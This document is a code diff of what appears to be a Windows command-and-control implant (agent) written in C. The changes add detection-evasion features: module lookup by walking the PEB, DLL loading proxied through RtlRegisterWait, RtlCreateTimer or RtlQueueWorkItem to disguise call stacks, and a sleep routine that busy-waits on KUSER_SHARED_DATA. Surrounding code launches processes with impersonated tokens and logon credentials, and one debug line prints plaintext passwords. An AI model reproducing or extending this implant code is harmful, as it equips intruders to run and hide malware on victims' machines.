@@ -5,6 +5,7 @@
 #include <Core/Package.h>
 #include <Core/Syscalls.h>
 #include <Common/Macros.h>
+#include <Common/Native.h>
 
 /*!
  * Extended String Hasher
@@ -57,7 +58,7 @@ ULONG HashEx(
 }
 
 /*!
- * load module from PEB InLoadOrderModuleList
+ * load module from PEB InLoadOrderModuleList by Hash
  * @param Hash
  * @return
  */
@@ -90,33 +91,220 @@ PVOID LdrModulePeb(
     return NULL;
 }
 
+/*!
+ * load module from PEB InLoadOrderModuleList by String
+ * @param Module name of module (needs to be upper case: MODULE.DLL)
+ * @return
+ */
+PVOID LdrModulePebByString(
+    IN LPWSTR Module
+) {
+    PLDR_DATA_TABLE_ENTRY Ldr  = NULL;
+    PLIST_ENTRY		      Hdr  = NULL;
+    PLIST_ENTRY		      Ent  = NULL;
+    PPEB			      Peb  = NULL;
+    LPWSTR                Name = { 0 };
+    ULONG                 Idx  = 0;
+
+    /* Get pointer to list */
+    if ( ! Instance.Teb ) {
+        Instance.Teb = NtCurrentTeb();
+    }
+
+    Name = NtHeapAlloc( MAX_PATH );
+
+    Peb = Instance.Teb->ProcessEnvironmentBlock;
+    Hdr = & Peb->Ldr->InLoadOrderModuleList;
+    Ent = Hdr->Flink;
+
+    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
+        Ldr = C_PTR( Ent );
+
+        if ( Ldr->BaseDllName.Length <= 260 ) {
+
+            MemCopy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
+
+            /* turn the module name from PEB to upper */
+            do {
+                if ( Idx < Ldr->BaseDllName.Length ) {
+                    if ( Name[ Idx ] >= 'a' ) {
+                        Name[ Idx ] -= 0x20;
+                    }
+                } else {
+                    break;
+                }
+
+                Idx++;
+            } while ( TRUE );
+            Idx = 0;
+
+            /* Compare the DLL Name! */
+            if ( ( StringCompareW( Name, Module ) == 0 ) || Module == NULL ) {
+                return Ldr->DllBase;
+            }
+
+            MemZero( Name, MAX_PATH );
+        }
+    }
+
+    if ( Name ) {
+        MemZero( Name, MAX_PATH );
+        NtHeapFree( Name );
+        Name = NULL;
+    }
+
+    return NULL;
+}
+
+/*!
+ * Load Library by string name.
+ *
+ * @note
+ *  based on how it is configured to load the module
+ *  it either proxy calls LoadLibraryW using RtlRegisterWait/RtlCreateTimer/RtlQueueWorkItem
+ *  or it directly uses LdrLoadDll.
+ *
+ * @param ModuleName module name to load
+ * @return
+ */
 PVOID LdrModuleLoad(
     IN LPSTR ModuleName
 ) {
     UNICODE_STRING UnicodeString  = { 0 };
-    WCHAR          MdlName[ 260 ] = { 0 };
-    PVOID          Module         = NULL;
-    USHORT         DestSize       = 0;
+    WCHAR          NameW[ 260 ]   = { 0 };
+    PVOID          Module         = { 0 };
+    USHORT         DestSize       = { 0 };
+    HANDLE         Event          = { 0 };
+    HANDLE         Queue          = { 0 };
+    HANDLE         Timer          = { 0 };
+    DWORD          Count          = 5;
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
     if ( ! ModuleName ) {
         return NULL;
     }
 
-    CharStringToWCharString( MdlName, ModuleName, StringLengthA( ModuleName ) );
+    /* convert module ansi string to unicode string */
+    CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );
 
-    DestSize                    = StringLengthW( MdlName ) * sizeof( WCHAR );
-    UnicodeString.Length        = DestSize;
-    UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
-    UnicodeString.Buffer        = MdlName;
+    /* get size of module unicode string */
+    DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
 
-    /* Let's load that Module
-     * NOTE: LdrLoadDll needs to be resolved or else we have a problem */
-    if ( Instance.Win32.LdrLoadDll ) {
-        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
-            PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
-            NtSetLastError( NtStatus );
+    /* if proxy module loading is enabled */
+    if ( Instance.Config.Implant.ProxyLoading )
+    {
+        /* load library using RtlRegisterWait + LoadLibraryW */
+        if ( ( Instance.Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && Instance.Win32.RtlRegisterWait )
+        {
+            PUTS( "Loading module using RtlRegisterWait" )
+
+            /* create an event for end of module loading */
+            if ( ! NT_SUCCESS( NtStatus = SysNtCreateEvent( &Event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
+                goto DEFAULT;
+            }
+
+            /* call LoadLibraryW */
+            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlRegisterWait( &Timer, Event, C_PTR( Instance.Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+                PRINTF( "RtlRegisterWait: %p\n", NtStatus )
+                goto DEFAULT;
+            }
         }
+
+        /* load library using RtlCreateTimer + LoadLibraryW */
+        else if ( ( Instance.Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && Instance.Win32.RtlCreateTimer )
+        {
+            PUTS( "Loading module using RtlCreateTimer" )
+
+            /* create timer queue */
+            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue ) ) ) {
+                PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
+                goto DEFAULT;
+            }
+
+            /* call LoadLibraryW */
+            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+                PRINTF( "RtlCreateTimer: %p\n", NtStatus )
+                goto DEFAULT;
+            }
+        }
+
+        /* load library using RtlQueueWorkItem + LoadLibraryW */
+        else if ( ( Instance.Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance.Win32.RtlQueueWorkItem )
+        {
+            PUTS( "Loading module using RtlQueueWorkItem" )
+
+            /* call LoadLibraryW and load specified module */
+            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlQueueWorkItem( C_PTR( Instance.Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
+                PRINTF( "RtlQueueWorkItem Failed: %p\n", NtStatus )
+
+                /* if we failed to load the module via RtlQueueWorkItem + LoadLibraryW then
+                 * try to load it using LdrLoadDll */
+                goto DEFAULT;
+            }
+        } else {
+            goto DEFAULT;
+        }
+
+
+        do {
+            /* after 5 times checking give up.
+             * use LdrLoadDll instead */
+            if ( ! Count ) {
+                break;
+            }
+
+            /* now let's try to get the module
+             * if we failed to load the module then try using LdrLoadDll
+             * NOTE: we are getting the module by string because there are some hash collisions
+             *       when using LdrModulePeb */
+            if ( ( Module = LdrModulePebByString( NameW ) ) ) {
+                break;
+            }
+
+            /* a little delay between each PEB check */
+            SharedSleep( 100 );
+
+            /* decrease counter */
+            Count--;
+        } while ( TRUE );
+    }
+    else
+    {
+    DEFAULT:
+        /* load library using LdrLoadDll */
+        if ( Instance.Win32.LdrLoadDll )
+        {
+            PUTS( "Loading module using LdrLoadDll" )
+
+            /* prepare unicode string */
+            UnicodeString.Buffer        = NameW;
+            UnicodeString.Length        = DestSize;
+            UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
+
+            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
+                PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
+                NtSetLastError( NtStatus );
+            }
+        }
+    }
+
+END:
+    /* clear stuff from stack */
+    MemZero( NameW, sizeof( NameW ) );
+    MemZero( &UnicodeString, sizeof( UnicodeString ) );
+
+    PRINTF( "Module \"%s\": %p\n", ModuleName, Module )
+
+    /* close event end */
+    if ( Event ) {
+        SysNtClose( Event );
+        Event = NULL;
+    }
+
+    /* close queue */
+    if ( Queue ) {
+        Instance.Win32.RtlDeleteTimerQueue( Queue );
+        Queue = NULL;
     }
 
     return Module;
@@ -330,8 +518,8 @@ BOOL ProcessCreate(
                     lpCurrentDirectory,
                     &StartUpInfo,
                     ProcessInfo
+            )
                     )
-                )
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                 TokenImpersonate( TRUE );
@@ -345,19 +533,19 @@ BOOL ProcessCreate(
             PUTS( "CreateProcessWithLogonW" )
             PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance.Tokens.Token->lpUser, Instance.Tokens.Token->lpDomain, Instance.Tokens.Token->lpPassword )
             if ( ! Instance.Win32.CreateProcessWithLogonW(
-                        Instance.Tokens.Token->lpUser,
-                        Instance.Tokens.Token->lpDomain,
-                        Instance.Tokens.Token->lpPassword,
-                        LOGON_NETCREDENTIALS_ONLY,
-                        App,
-                        CmdLine,
-                        Flags | CREATE_NO_WINDOW,
-                        NULL,
-                        lpCurrentDirectory,
-                        &StartUpInfo,
-                        ProcessInfo
+                    Instance.Tokens.Token->lpUser,
+                    Instance.Tokens.Token->lpDomain,
+                    Instance.Tokens.Token->lpPassword,
+                    LOGON_NETCREDENTIALS_ONLY,
+                    App,
+                    CmdLine,
+                    Flags | CREATE_NO_WINDOW,
+                    NULL,
+                    lpCurrentDirectory,
+                    &StartUpInfo,
+                    ProcessInfo
+            )
                     )
-                )
             {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                 TokenImpersonate( TRUE );
@@ -382,8 +570,8 @@ BOOL ProcessCreate(
                 NULL,
                 &StartUpInfo,
                 ProcessInfo
+        )
                 )
-            )
         {
             PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -445,7 +633,7 @@ BOOL ProcessCreate(
         JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
     }
 
-Cleanup:
+    Cleanup:
     return Return;
 }
 
@@ -489,7 +677,7 @@ NTSTATUS ProcessSnapShot(
         NtStatus = STATUS_INVALID_PARAMETER;
     }
 
-LEAVE:
+    LEAVE:
     return NtStatus;
 }
 
@@ -520,7 +708,7 @@ BOOL ReadLocalFile(
 
     Success = TRUE;
 
-Cleanup:
+    Cleanup:
     if ( hFile ) {
         SysNtClose( hFile );
         hFile = NULL;
@@ -774,7 +962,7 @@ BOOL PipeRead(
  * @return pipe write successful or not
  */
 BOOL PipeWrite(
-    IN HANDLE   Handle,
+    IN  HANDLE   Handle,
     OUT PBUFFER Buffer
 ) {
     DWORD Written = 0;
@@ -791,11 +979,6 @@ BOOL PipeWrite(
     return TRUE;
 }
 
-typedef struct __attribute__((packed))
-{
-    ULONG ExtendedProcessInfo;
-    ULONG ExtendedProcessInfoBuffer;
-} EXTENDED_PROCESS_INFORMATION, *PEXTENDED_PROCESS_INFORMATION;
 
 /*!
  * @brief
@@ -814,11 +997,11 @@ BOOL CfgQueryEnforced(
 
     /* query if Cfg is enabled or not. */
     if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationProcess(
-        NtCurrentProcess(),
-        ProcessCookie | ProcessUserModeIOPL,
-        &ProcInfoEx,
-        sizeof( ProcInfoEx ),
-        NULL )
+            NtCurrentProcess(),
+            ProcessCookie | ProcessUserModeIOPL,
+            &ProcInfoEx,
+            sizeof( ProcInfoEx ),
+            NULL )
     ) ) {
         PRINTF( "NtQueryInformationProcess Failed => %p\n", NtStatus );
         return FALSE;
@@ -885,7 +1068,7 @@ ULONG RandomNumber32(
 ) {
     ULONG Seed = 0;
 
-    Seed = Instance.Win32.GetTickCount();
+    Seed = NtGetTickCount();
     Seed = Instance.Win32.RtlRandomEx( &Seed );
     Seed = Instance.Win32.RtlRandomEx( &Seed );
     Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;
@@ -902,12 +1085,54 @@ BOOL RandomBool(
 ) {
     ULONG Seed = 0;
 
-    Seed = Instance.Win32.GetTickCount();
+    Seed = NtGetTickCount();
     Seed = Instance.Win32.RtlRandomEx( &Seed );
 
     return Seed % 2 == 0 ? TRUE : FALSE;
 }
 
-VOID volatile ___chkstk_ms(
+/*!
+ * get current timestamp since unix epoch
+ * from KUSER_SHARED_DATA
+ * @return
+ */
+ULONGLONG SharedTimestamp(
     VOID
+) {
+    SIZE_T        UnixStart     = 0x019DB1DED53E8000; /* Start of Unix epoch in ticks. */
+    SIZE_T        TicksPerMilli = 1000;
+    LARGE_INTEGER Time          = { 0 };
+
+    Time.LowPart  = USER_SHARED_DATA->SystemTime.LowPart;
+    Time.HighPart = USER_SHARED_DATA->SystemTime.High2Time;
+
+    return ( ULONGLONG ) ( ( Time.QuadPart - UnixStart ) / TicksPerMilli );
+}
+
+/*!
+ * Sleep using KUSER_SHARED_DATA.SystemTime
+ * @param Delay
+ */
+VOID SharedSleep(
+    SIZE_T Delay
+) {
+    SIZE_T    Rand = { 0 };
+    ULONGLONG End  = { 0 };
+
+    Rand = RandomNumber32();
+    End  = SharedTimestamp() + Delay;
+
+    /* increment random number til we reach the end */
+    while ( SharedTimestamp() < End ) {
+        Rand += 1;
+    }
+
+    if ( ( SharedTimestamp() - End ) > 2000 ) {
+        return;
+    }
+}
+
+
+VOID volatile ___chkstk_ms(
+        VOID
 ) { __asm__( "nop" ); }
